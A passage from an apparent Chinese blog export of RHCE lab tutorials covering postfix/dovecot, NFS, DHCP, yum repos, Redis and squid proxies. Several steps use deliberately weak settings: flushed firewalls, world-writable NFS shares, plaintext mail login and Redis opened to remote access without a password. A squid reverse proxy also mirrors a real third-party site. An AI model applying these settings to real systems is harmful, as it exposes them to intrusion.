<li>编辑配置文件/etc/postfix/main.cf<br>设置myhostname、mydomain、myorigin这三个变量：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image69c54a8015c99773.png" alt="image69c54a8015c99773.png"><br>设置网卡监听地址：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image69dd1432b9570be3.png" alt="image69dd1432b9570be3.png"><br>设置邮件接收方的主机名或域名：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/imagee5cb9cee3ea2554f.png" alt="imagee5cb9cee3ea2554f.png"></li>
<li>重启postfix服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart postfix</span><br><span class="line">systemctl enable postfix</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="5">
<li>部署dovecot收件服务</li>
</ol>
<ul>
<li>增加用户kk，并设置密码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd kk</span><br><span class="line">passwd kk</span><br></pre></td></tr></table></figure></li>
<li>安装dovecot<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install dovecot</span><br></pre></td></tr></table></figure></li>
<li>编辑主配置文件/etc/dovecot/dovecot.conf<br>取消注释第24行，新增第25行（允许非密文登录）<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image7ddbb9609df3f423.png" alt="image7ddbb9609df3f423.png"><br>第48行，设置允许登录的网段范围<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image3e051af8b5e55e9d.png" alt="image3e051af8b5e55e9d.png"></li>
<li>编辑配置文件/etc/dovecot/conf.d/10-mail.conf，取消注释第25行<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/imagea03b4c9df318798b.png" alt="imagea03b4c9df318798b.png"></li>
<li>登录到kk用户，创建目录<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su - kk</span><br><span class="line">mkdir -p mail/.iamp/INBOX</span><br></pre></td></tr></table></figure></li>
<li>设置变量alias，把xxoo作为root的虚拟用户<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/aliases</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image79944858dee6c333.png" alt="image79944858dee6c333.png"></li>
<li>重启dovecot服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart dovecot</span><br><span class="line">systemctl enable dovecot</span><br></pre></td></tr></table></figure>
<h2 id="使用outlook测试邮局"><a href="#使用outlook测试邮局" class="headerlink" title="使用outlook测试邮局"></a>使用outlook测试邮局</h2></li>
<li>outlook邮件设置：网关和DNS设置为服务端的IP地址<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image.png" alt="image.png"></li>
<li>测试发送邮件到root用户<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image73696f02bb61c9ad.png" alt="image73696f02bb61c9ad.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image6f98ab3c6857f179.png" alt="image6f98ab3c6857f179.png"></li>
<li>测试发送邮件到xxoo用户（这是一个虚拟用户，实际不存在），xxoo用户会把邮件转发给root用户<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/imageb2e39528680a0c15.png" alt="imageb2e39528680a0c15.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/imagec3d9c9329d47a7a4.png" alt="imagec3d9c9329d47a7a4.png"></li>
<li>测试服务端root用户发送邮件到kk用户<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image5b870e44b330c5fc.png" alt="image5b870e44b330c5fc.png"></li>
</ul>
<hr>
<p>遇到一个问题：kk用户没有收到邮件。<br>原因分析：既然是收件出现问题，就检查一下服务端的dovecot服务，果然不正常，有如下报错：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image3f20e5343c9e7774.png" alt="image3f20e5343c9e7774.png"><br>参考官方解决方法，将/var/mail目录下的内容都 改为600权限，重启dovecot服务，问题解决。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 0600 /var/mail/*</span><br><span class="line">systemctl restart dovecot</span><br></pre></td></tr></table></figure>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image55fb0bb46d4f9fa1.png" alt="image55fb0bb46d4f9fa1.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image3c41998b54160853.png" alt="image3c41998b54160853.png"><br>验证：现在kk用户可以收取到root发送的邮件了。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/10/image58cacaebcd0fd41d.png" alt="image58cacaebcd0fd41d.png"></p>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>postfix</tag>
        <tag>dovecot</tag>
        <tag>outlook</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7自带的NFS服务实现Linux主机之间的目录共享</title>
    <url>//posts/ZH-CN/redhat7-NFS-linux-share.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>redhat7自带的NFS服务可以实现linux主机之间的目录共享，不需要额外安装其他服务。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="NFS实现linux主机之间的目录共享"><a href="#NFS实现linux主机之间的目录共享" class="headerlink" title="NFS实现linux主机之间的目录共享"></a>NFS实现linux主机之间的目录共享</h2><p>redhat7默认安装了nfs-utils软件，只需要使用即可。</p>
<ol>
<li>服务端创建共享目录，设置共享范围，清空防火墙规则，并重启服务</li>
</ol>
<ul>
<li><p>创建共享目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /linuxshare</span><br><span class="line">chmod -Rf 777 /linuxshare</span><br></pre></td></tr></table></figure></li>
<li><p>设置共享范围：编辑<code>/etc/exports</code>文件<br>配置文件内容，只有一行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/linuxshare *(sync,rw,root_squash)</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>解析：linux系统中，<code>*</code>指的是共享范围是所有人。<br><code>root_squash</code>是把客户端的root用户映射为匿名用户。举例：金正恩到中国，就没有中国主席的权限。</p>
          </div>
</li>
<li><p>清空防火墙规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></li>
<li><p>重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nfs-server</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>客户端创建挂载点<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /linuxshareclient</span><br><span class="line">chmod -Rf 777 /linuxshareclient</span><br></pre></td></tr></table></figure></li>
<li>客户端挂载服务端的共享目录，即可实现linux主机之间的目录共享<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/fstab</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>新增这一句，挂载上服务端的共享目录：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.0.106:/linuxshare /linuxshareclient nfs defaults 0 0</span><br></pre></td></tr></table></figure></li>
<li>挂载，重启服务即可生效：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -a</span><br><span class="line">systemctl restart nfs-server</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>NFS服务</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7部署DHCP服务</title>
    <url>//posts/ZH-CN/redhat7-DHCP.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为DHCP服务器端，需要设置静态IP地址。并且服务端和客户端都得是仅主机模式。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="服务端部署DHCP服务"><a href="#服务端部署DHCP服务" class="headerlink" title="服务端部署DHCP服务"></a>服务端部署DHCP服务</h2><ul>
<li>服务端网卡设置，重启网卡使配置生效<br>IP地址：192.168.0.20<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/09/image.png" alt="image.png"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart network #重启网卡</span><br></pre></td></tr></table></figure></li>
<li>安装dhcp软件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install dhcp</span><br></pre></td></tr></table></figure></li>
<li>编辑dhcp服务配置文件<code>/etc/dhcp/dhcpd.conf</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ddns-update-style none;</span><br><span class="line">ignore client-updates;</span><br><span class="line">subnet 192.168.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">range 192.168.0.50 192.168.0.100; #IP地址池</span><br><span class="line">option subnet-mask 255.255.255.0; #子网掩码</span><br><span class="line">option routers 192.168.0.20; #路由器</span><br><span class="line">option domain-name-servers 192.168.0.20; #DHCP服务器的IP地址</span><br><span class="line">default-lease-time 21600; #默认租约</span><br><span class="line">max-lease-time 43200; #最长租约</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>启动DHCP服务并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start dhcpd</span><br><span class="line">systemctl enable dhcpd</span><br></pre></td></tr></table></figure></li>
<li>清除iptables规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
<h2 id="客户端验证DHCP服务器效果"><a href="#客户端验证DHCP服务器效果" class="headerlink" title="客户端验证DHCP服务器效果"></a>客户端验证DHCP服务器效果</h2></li>
<li>编辑虚拟机网络编辑器，取消DHCP的设置<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/09/image40d8da1bf24c05d3.png" alt="image40d8da1bf24c05d3.png"></li>
<li>设置网卡，改成DHCP方式获取IP地址，重启网卡使配置生效<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/09/image44ab240a1b5043c2.png" alt="image44ab240a1b5043c2.png"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure></li>
<li>检查机器获取到的IP地址，已获取到DHCP服务器地址池里面随机分配的地址<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/09/imageb5b8d32ddb4c1d0d.png" alt="imageb5b8d32ddb4c1d0d.png"><h2 id="服务端可查看客户端的MAC地址"><a href="#服务端可查看客户端的MAC地址" class="headerlink" title="服务端可查看客户端的MAC地址"></a>服务端可查看客户端的MAC地址</h2></li>
<li>重启客户端的网卡，查看服务端的日志，可找到客户端使用DHCP服务的详情，包括客户端的MAC地址<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -f /var/log/messages</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/09/imageb3c3b368e25ab25b.png" alt="imageb3c3b368e25ab25b.png"><h2 id="服务端为某个客户端分配固定的IP地址"><a href="#服务端为某个客户端分配固定的IP地址" class="headerlink" title="服务端为某个客户端分配固定的IP地址"></a>服务端为某个客户端分配固定的IP地址</h2></li>
<li>服务端配置文件添加以下内容，将客户端的MAC地址和固定IP地址做绑定<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host dana&#123;</span><br><span class="line">        hardware ethernet 00:0c:29:1b:b1:9d;</span><br><span class="line">        fixed-address 192.168.0.66;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/09/imageca35b36e6528b081.png" alt="imageca35b36e6528b081.png"></li>
<li>服务端重启dhcp服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart dhcpd</span><br></pre></td></tr></table></figure></li>
<li>客户端重启网卡，检查机器获取的IP地址是否是服务端分配的IP<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/09/image2494cb3bf40a8e29.png" alt="image2494cb3bf40a8e29.png"></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>DHCP</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7配置yum仓库的方法</title>
    <url>//posts/ZH-CN/redhat7-config-yum-repo.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>老是记不住yum仓库怎么配置，经常遇到yum仓库配置不对引起的错误，在此记下redhat7的yum仓库配置方法。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="yum仓库配置方法"><a href="#yum仓库配置方法" class="headerlink" title="yum仓库配置方法"></a>yum仓库配置方法</h2><p>环境：redhat7</p>
<ol>
<li>编辑yum配置文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /etc/yum.repo.d</span><br><span class="line">vi rhel7.repo</span><br></pre></td></tr></table></figure>
<details><summary>点击展开配置文件内容</summary>
<p>

</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[rhel7]</span><br><span class="line">name=rhel7</span><br><span class="line">baseurl=file:///media/cdrom</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br></pre></td></tr></table></figure>

</p>
</details>

<ol start="2">
<li>挂载光盘</li>
</ol>
<ul>
<li>创建挂载点<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /media/cdrom</span><br></pre></td></tr></table></figure></li>
<li>挂载光盘<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount /dev/cdrom /media/cdrom</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p><img src="https://v2ray.dana5haw.com:8008/images/2020/07/02/image.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>yum仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>redis数据库学习总结</title>
    <url>//posts/ZH-CN/Redis_Summary.html</url>
    <content><![CDATA[<h2 id="安装redis-server"><a href="#安装redis-server" class="headerlink" title="安装redis-server"></a>安装redis-server</h2><p><code>sudo apt-get install redis-server</code></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="redis服务命令"><a href="#redis服务命令" class="headerlink" title="redis服务命令"></a>redis服务命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo service redis-server start #开启服务器</span><br><span class="line">sudo service redis-server stop #停止服务</span><br><span class="line">sudo service redis-server restart #重启服务</span><br></pre></td></tr></table></figure>
<p>最好是用指定配置文件的方式开启redis-server。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dana:~# redis-server /etc/redis/redis.conf</span><br><span class="line">root@dana:~# ps -ef |grep redis</span><br><span class="line">redis      4003      1  0 09:27 ?        00:00:00 /usr/bin/redis-server *:6379</span><br><span class="line">root       4011   2276  0 09:28 pts/0    00:00:00 grep --color=auto redis</span><br></pre></td></tr></table></figure>
<p>设置开启守护进程：（这样我们启动服务，redis进程就在后台运行）<br>修改redis配置文件（<code>/etc/redis/redis.conf</code>），将<code>daemonize no</code>改为<code>daemonize yes</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb3hbgl9pj30pl0jugny.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcb3kyg7oej30n104874m.jpg" alt="image.png"><br>设置守护进程之后，用<code>kill -9</code>停止进程。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dana:~# ps -ef |grep redis</span><br><span class="line">root       4327      1  0 09:37 ?        00:00:00 redis-server *:6379</span><br><span class="line">root       4421   2276  0 09:43 pts/0    00:00:00 grep --color=auto redis</span><br><span class="line">root@dana:~# kill -9 4327</span><br><span class="line">root@dana:~# ps -ef |grep redis</span><br><span class="line">root       4423   2276  0 09:43 pts/0    00:00:00 grep --color=auto redis</span><br></pre></td></tr></table></figure>
<h2 id="连接redis"><a href="#连接redis" class="headerlink" title="连接redis"></a>连接redis</h2><ul>
<li>本地连接<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli #本地连接</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure></li>
<li>远程连接<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.0.1 -p 6379 #远程连接</span><br><span class="line">192.168.0.1:6379&gt;</span><br></pre></td></tr></table></figure>
这里远程连接遇到问题：<code>Connection confused</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9xb1fpvtj30lg01vweg.jpg" alt="image.png"><br>解决方法：修改redis配置文件(<code>/etc/redis/redis.conf</code>)，注释掉<code>bind 127.0.0.1::1</code>这一句。这句的意思是绑定IP为127.0.0.1，绑了之后就无法远程连接，因此我们把这一句注释掉。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc9x5x8cz4j310i0iu40n.jpg" alt="image.png"><br>重启redis服务，配置即可生效。<br><code>sudo service redis-server restart</code><h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><a href="https://blog.csdn.net/t544846450/article/details/93504156">https://blog.csdn.net/t544846450/article/details/93504156</a><br><a href="https://blog.csdn.net/NRlovestudy/article/details/90234501">https://blog.csdn.net/NRlovestudy/article/details/90234501</a></li>
</ul>
]]></content>
      <categories>
        <category>redis数据库</category>
      </categories>
      <tags>
        <tag>redis数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>redhat7部署squid服务</title>
    <url>//posts/ZH-CN/redhat7-build-squid-server.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>squid可正向代理、正向透明代理、反向代理。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="squid正向代理"><a href="#squid正向代理" class="headerlink" title="squid正向代理"></a>squid正向代理</h2><p>正向代理和SNAT原理类似。<br>服务端：两块网卡，一块连外网，一块连内网</p>
<ul>
<li>网卡一：桥接模式，连外网 </li>
<li>网卡二：仅主机模式，连内网，IP地址（192.168.0.106）<br>客户端：单网卡，仅主机模式，IP地址（192.168.0.102）<br>正向代理搭建过程：</li>
</ul>
<ol>
<li>配置双网卡</li>
</ol>
<ul>
<li>新增网卡<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image.png" alt="image.png"></li>
<li>开启新增网卡<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image265c2b32707a5a1b.png" alt="image265c2b32707a5a1b.png"></li>
<li>配置网卡<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nm-connection-editor #进入图形化界面配置网卡</span><br></pre></td></tr></table></figure></li>
<li>外网网卡配置<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image7140b2e3e4527852.png" alt="image7140b2e3e4527852.png"></li>
<li>内网网卡配置<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image1600272b0e2e2222.png" alt="image1600272b0e2e2222.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image927d534047159c16.png" alt="image927d534047159c16.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image60c900cb240b5142.png" alt="image60c900cb240b5142.png"></li>
<li>重启网卡使配置生效<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image9b4429ed27c3a58b.png" alt="image9b4429ed27c3a58b.png"></li>
</ul>
<ol start="2">
<li>安装squid<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install squid</span><br></pre></td></tr></table></figure></li>
<li>清除防火墙规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure></li>
<li>重启squid并加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart squid</span><br><span class="line">systemctl enable squid</span><br></pre></td></tr></table></figure></li>
<li>客户端验证正向代理<br>客户端是仅主机模式，本身无法访问互联网网站，但是经过服务端的正向代理后，就可以访问互联网。</li>
</ol>
<ul>
<li>客户端浏览器设置代理：设置为服务端的3128端口（squid服务默认端口）<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image70e74e9682a1191a.png" alt="image70e74e9682a1191a.png"></li>
<li>检查客户端是否能访问互联网网站<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image49f4a88c22965db1.png" alt="image49f4a88c22965db1.png"></li>
</ul>
<ol start="6">
<li>正向代理设置访问控制</li>
</ol>
<ul>
<li>禁止url含有特定词的访问</li>
</ul>
<p>（1）修改配置文件/etc/squid/squid.conf，增加以下语句：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image4f6951b33296de8a.png" alt="image4f6951b33296de8a.png"><br>（2）重启squid服务使配置生效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart squid</span><br></pre></td></tr></table></figure>
<p>（3）验证：url里面含有linux，已被squid拦截。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image0348992fed9143de.png" alt="image0348992fed9143de.png"></p>
<ul>
<li>仅允许某个IP使用正向代理服务</li>
</ul>
<p>（1）修改配置文件/etc/squid/squid.conf，增加以下语句：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/imageeb5cb2c90fcdc01b.png" alt="imageeb5cb2c90fcdc01b.png"><br>（2）重启squid服务使配置生效</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart squid</span><br></pre></td></tr></table></figure>
<p>（3）验证：将客户端的IP改为其他IP地址，则无法使用正向代理访问互联网<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image5b7d495c01009ca8.png" alt="image5b7d495c01009ca8.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image529422e4ac01d2b4.png" alt="image529422e4ac01d2b4.png"></p>
<ol start="7">
<li>服务端设置正向透明代理<br>透明代理是对客户端而言，客户端不用在浏览器设置代理，就是透明代理。以下是正向透明代理的设置方法：</li>
</ol>
<ul>
<li>修改配置文件/etc/squid/squid.conf，修改以下语句：<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image66787df57652fefe.png" alt="image66787df57652fefe.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image82735d8d4a7624b4.png" alt="image82735d8d4a7624b4.png"></li>
<li>检查配置文件语法是否正确<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">squid -k parse</span><br></pre></td></tr></table></figure></li>
<li>停止squid服务，初始化透明模式的squid配置<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image439cf4390b7aa491.png" alt="image439cf4390b7aa491.png"></li>
<li>重启squid服务<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart squid</span><br></pre></td></tr></table></figure></li>
<li>服务端设置防火墙策略，使客户端与服务端共用外网网卡访问互联网<br>（1）方法一：通过iptables设置转发策略<br>开启DNS服务的数据转发功能，允许squid转发IPv4数据包<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F</span><br><span class="line">iptables -t nat -A POSTROUTING -p udp --dport 53 -o eno16777736 -j MASQUERADE</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image672695e7696f852d.png" alt="image672695e7696f852d.png"><br>把客户端的80端口请求转发到服务端的3128端口（squid服务的端口），并且对客户端的IP做SNAT（源地址转换，使得客户端与服务端共用外网网卡）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -m tcp --dport 80 -j  REDIRECT --to-ports 3128</span><br><span class="line">iptables -t nat -A POSTROUTING -s 192.168.0.102 -o eno16777736 -j SNAT --to 192.168.43.208</span><br><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image9f3f73a7e1eed80f.png" alt="image9f3f73a7e1eed80f.png"><br>（2）方法二：通过firewalld-config设置转发策略<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/imagecb1b5596770b28bd.png" alt="imagecb1b5596770b28bd.png"></li>
<li>客户端修改网卡配置，将网关设置为服务端IP地址192.168.0.106，DNS服务设置为8.8.8.8。浏览器不设置代理，即可访问互联网网站。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image6279dfa426002e43.png" alt="image6279dfa426002e43.png"></li>
</ul>
<h2 id="squid反向代理"><a href="#squid反向代理" class="headerlink" title="squid反向代理"></a>squid反向代理</h2><p>就是可以在用代理服务器的IP地址访问到网站内容，看起来这个网站就是代理服务器自己做的一样。说得通俗一点，就是偷别人的作品，冠上自己的姓名。以下是squid反向代理的配置方法：<br>重新做一台squid代理服务器，只需要一张桥接网卡，可连外网。</p>
<ul>
<li>安装squid<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install squid</span><br></pre></td></tr></table></figure></li>
<li>修改配置文件/etc/squid/squid.conf<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http_port 192.168.43.208:80 vhost #将本机外网网卡地址设置为虚拟主机</span><br><span class="line">cache_peer 122.142.74.150 parent 80 0  originserver #同步目标服务器的网站内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/image629638bce63ab274.png" alt="image629638bce63ab274.png"></li>
<li>重启squid服务并 加入开机启动项<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart squid</span><br><span class="line">systemctl enable squid</span><br></pre></td></tr></table></figure></li>
<li>在浏览器输入本机地址，即可访问到目标网站（<a href="http://www.jldaren.com）的内容，和原站一模一样">www.jldaren.com）的内容，和原站一模一样</a><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/imageb623a21ac4f98893.png" alt="imageb623a21ac4f98893.png"><br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/11/imagea38a90f80016fbd2.png" alt="imagea38a90f80016fbd2.png"></li>
</ul>
]]></content>
      <categories>
        <category>RHCE</category>
      </categories>
      <tags>
        <tag>redhat7</tag>
        <tag>squid</tag>
      </tags>
  </entry>
  <entry>
    <title>redis数据类型之hash命令</title>
    <url>//posts/ZH-CN/Redis_Hash.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hash类型存储结构对象，对象包括属性和属性值，值的类型是string。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
<li>设置hash的单个属性<br>语法：<code>hset hash field value</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hset user name dana</span><br><span class="line">(integer) 1</span><br></pre></td></tr></table></figure></li>
<li>设置hash的多个属性<br>语法：<code>hmset hash field1 value1 field2 value2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmset flower color red num 99</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></li>
<li>查看hash的数据类型<br>语法：<code>type hash</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; type user</span><br><span class="line">hash</span><br></pre></td></tr></table></figure></li>
<li>查看hash的属性<br>语法：<code>hkeys hash</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hkeys user</span><br><span class="line">1) &quot;name&quot;</span><br></pre></td></tr></table></figure></li>
<li>查看hash的单个属性值<br>语法：<code>hget hash field</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hget user name</span><br><span class="line">&quot;dana&quot;</span><br></pre></td></tr></table></figure></li>
<li>查看hash的多个属性值<br>语法：<code>hmget hash field1 field2</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hmget flower color num</span><br><span class="line">1) &quot;red&quot;</span><br><span class="line">2) &quot;99&quot;</span><br></pre></td></tr></table></figure></li>
<li>查看hash的所有属性值<br>语法：<code>hvals hash</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hvals flower</span><br><span class="line">1) &quot;red&quot;</span><br><span class="line">2) &quot;99&quot;</span><br></pre></td></tr></table></figure></li>
<li>删除hash的属性值<br>语法：<code>hdel hash field</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; hdel flower num #删除flower的num属性</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; hkeys flower #查询flower的属性</span><br><span class="line">1) &quot;color&quot;</span><br></pre></td></tr></table></figure></li>
<li>删除hash<br>语法：<code>del hash</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; del flower</span><br><span class="line">(integer) 1</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>redis数据库</category>
      </categories>
      <tags>
        <tag>redis数据类型</tag>
        <tag>hash命令</tag>
      </tags>
  </entry>
  <entry>
    <title>redis数据类型之list命令</title>
    <url>//posts/ZH-CN/Redis_List.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>list是redis数据库中的列表，列表元素的数据类型是string。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h2><ul>
